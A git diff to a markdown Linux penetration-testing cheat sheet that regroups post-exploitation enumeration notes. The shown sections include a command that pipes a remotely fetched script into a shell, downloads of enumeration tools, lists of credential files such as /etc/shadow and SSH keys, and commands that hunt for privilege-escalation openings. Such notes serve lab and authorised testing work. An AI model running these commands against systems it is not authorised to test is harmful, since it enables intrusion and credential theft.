@@ -5,7 +5,7 @@
 
 - [Auto Script](#auto-script)
 - [Command Injection](#command-injection)
-- [File Enumeration](#file-enumeration)
+- [Enumeration](#enumeration)
 - [FTP](#ftp)
 - [Gdbserver](#gdbserver)
 - [Port Forwarding](#port-forwarding)
@@ -19,9 +19,54 @@
 sudo -l
 ```
 
-# Auto Script
+# Enumeration
+## Script
+### LinPeas
 ```bash
 curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+```
+
+### Linux Smart Enumeration
+```bash
+curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh
+chmod +x lse.sh
+./lse.sh -l1
+```
+
+### Docker
+```bash
+curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O
+```
+
+## File
+### Classic
+- `/etc/passwd`  &  `/etc/shadow`
+- `/www/html` ꞏ `/var/www` ꞏ `/srv/html` ꞏ `/usr/share/*`
+- `/home/user/.ssh`
+- `/etc/cron.d`
+- `/opt/`
+- `/usr/local/bin`
+
+### Proc
+`/proc/` contains useful information about the processes that are currently running
+
+| directory	          | description                                     |
+|---------------------|-------------------------------------------------|
+| `/proc/PID/cmdline` | Command line arguments.                         |
+| `/proc/PID/cwd`     | Link to the current working directory.          |
+| `/proc/PID/environ` | Values of environment variables.                |
+| `/proc/PID/exe`     | Link to the executable of this process.         |
+| `/proc/PID/fd`      | Directory, which contains all file descriptors. |
+
+### Command
+```bash
+find / -user user 2>&-
+find / -group group 2>&-
+find / -user root -executable -type f 2>&- | grep -v /bin/
+```
+
+```bash
+/sbin/getcap -r *
 ```
 
 # Reverse Shell
@@ -95,7 +140,10 @@ scp -P port file user@192.168.1.ip:path
 ```
 scp -P 22 -r ~/.peda user@192.168.1.ip:/tmp/peda
 ```
+
 # FTP
+*Port: 21*
+
 ### Download all files
 ```
 wget -m --user=user--password=fpassword ftp://10.10.11.160
@@ -110,47 +158,6 @@ $ gdb
 (gdb) remote put local_file remote_file
 ```
 
-# File Enumeration
-### Classic
-- `/etc/passwd`  &  `/etc/shadow`
-- `/www/html` ꞏ `/var/www` ꞏ `/srv/html` ꞏ `/usr/share/*`
-- `/home/user/.ssh`
-- `/etc/cron.d`
-- `/opt/`
-
-### Proc
-`/proc/` contains useful information about the processes that are currently running
-
-| directory	          | description                                     |
-|---------------------|-------------------------------------------------|
-| `/proc/PID/cmdline` | Command line arguments.                         |
-| `/proc/PID/cwd`     | Link to the current working directory.          |
-| `/proc/PID/environ` | Values of environment variables.                |
-| `/proc/PID/exe`     | Link to the executable of this process.         |
-| `/proc/PID/fd`      | Directory, which contains all file descriptors. |
-
-### Command
-```bash
-find / -user user 2>&-
-find / -group group 2>&-
-find / -user root -executable -type f 2>&- | grep -v /bin/
-```
-
-```bash
-/sbin/getcap -r *
-```
-
-### Script
-```bash
-curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh
-chmod +x lse.sh
-./lse.sh -l1
-```
-
-### Docker
-```bash
-curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -O
-```
 
 # Command Injection
 ```bash
